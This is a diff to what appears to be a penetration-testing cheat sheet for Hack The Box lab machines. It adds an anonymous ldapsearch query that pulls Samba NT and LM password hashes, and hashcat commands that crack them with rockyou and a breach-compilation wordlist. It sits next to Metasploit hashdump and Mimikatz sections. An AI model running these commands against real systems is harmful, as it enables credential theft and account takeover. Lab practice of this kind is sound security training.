@@ -285,6 +285,7 @@ ldapsearch -h 10.10.10.107 -p 389 -x -s base -b '' "(objectClass=*)" "*" +
 
 ldapsearch -h 10.10.10.107 -p 389 -x -b "dc=example,dc=com"
 ldapsearch -h 10.10.10.107 -p 389 -x -b "dc=hackthebox,dc=htb"
+ldapsearch -h 10.10.10.107 -p 389 -x -b "dc=hackthebox,dc=htb" sambaNTPassword sambaLMPassword
 
 # list out all object classes
 ldapsearch -h 10.81.2.21 -p 389 -x -b "dc=example,dc=com" | grep objectClass | sort | uniq
@@ -433,6 +434,15 @@ run
 run post/windows/gather/smart_hashdump
 
 hashdump
+
+
+###################################
+#### HASHCAT                  #####
+###################################
+
+hashcat -m 1000 -a0 sambaNTPassword.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 3000 -a0 sambaLMPassword.txt breachcompilation.txt
+
 
 ###################################
 #### MIMIKATZ                 #####
